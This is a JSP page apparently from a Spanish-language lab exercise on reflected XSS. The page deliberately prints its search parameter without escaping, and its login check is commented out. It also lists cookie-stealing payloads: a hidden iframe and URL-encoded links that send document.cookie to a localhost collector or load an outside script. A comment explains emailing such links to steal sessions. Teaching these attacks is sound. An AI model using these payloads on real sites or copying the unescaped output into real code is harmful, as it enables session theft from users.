<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    
<%
//HttpSession sesion = request.getSession();
//if(sesion == null || sesion.getAttribute("usuario")==null){
//	response.sendRedirect("../login.html");
	//return;
//}
%>    
    
    
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<script type="text/javascript" src="avisoTimeout.jsp"></script>
<body>

	<h1 align="center">
		<font color="green">
			Pagina de inicio. Usuario: ${usuario.nombre}
		</font>
	</h1>
		
	<form action="../SVLogin" method="post">
		<input type="hidden" name="accion" value="logout"/>		
		<p align="center">
			<input type="submit" value="salir"/>
		</p>
	</form>
	
	<form action="SVBusquedas">
		<p align="center">
			Introduzca un criterio de búsqueda 
			<input type="text" name="criterio"/>
			<input type="submit" value="Buscar"/>
		</p>
	</form>
	
	<!-- Podemos inyectar estos mismo ejemplos del XSS Cookies
		La clave de esto seria la siguiente, una vez inyectado esto en el
		caja de texto y mandandolo, podemos cogerlo de la barra de navegacion
		copiarlo y mandarselo por correo a cualquiera, de tal manera que podriamos
		inyectarle de esa manera el javascript para robarle su session por ejemplo
	 -->
	<p align="center">
		iframe height='0' width='0' src="javascript:document.location='http://localhost:8080/Ej06_XSS_Cookies_Indeseables/peticion_inocua?galletas='+document.cookie; "></iframe>			
	</p>
	
	<p align="center">
		http://localhost:8080/Ej06_XSS_Reflected/seguro/SVBusquedas?criterio=%3Ciframe+height%3D%270%27+width%3D%270%27+src%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Flocalhost%3A8080%2FEj06_XSS_Cookies_Indeseables%2Fpeticion_inocua%3Fgalletas%3D%27%2Bdocument.cookie%3B+%22%3E
	</p>	
	
	<p align="center">
		http://localhost:8080/Ej06_XSS_Reflected/seguro/SVBusquedas?criterio=%3Cscript+src%3D%22http%3A%2F%2Flocalhost%3A8080%2FEj06_XSS_Cookies_Indeseables%2Fjavascript.js%22%3E%3C%2Fscript%3E
	</p>
	

	<%
	String criterio  = (String) request.getAttribute("criterio");
	String resultado = (String) request.getAttribute("resultado"); 
	
	if( criterio!=null ){	
		out.println("<h2 align=center>Resultados de la busqueda para "+criterio+"</h2>");
		out.println("<p align=center>"+resultado+"</p>");
	}	
	%>

</body>
</html>